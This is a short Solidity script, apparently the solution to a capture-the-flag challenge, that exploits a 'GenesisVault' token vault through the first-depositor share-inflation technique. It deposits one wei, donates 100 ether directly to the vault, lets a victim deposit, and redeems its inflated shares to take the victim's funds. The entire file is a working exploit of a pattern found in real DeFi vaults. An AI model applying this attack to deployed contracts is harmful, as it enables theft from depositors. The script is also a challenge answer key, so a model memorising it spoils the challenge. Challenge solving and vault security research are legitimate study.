
pragma solidity 0.8.24;

import "../src/Setup.sol";
import "../src/Token.sol";
import "../src/GenesisVault.sol";

contract Solve {
    function test_solve() external {
        Setup setup = new Setup(address(this));
        Token token = setup.token();
        GenesisVault vault = setup.vault();

        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, address(this));
        token.transfer(address(vault), 100 ether);
        setup.victimDeposit();
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));

        require(setup.isSolved(), "not solved");
    }
}
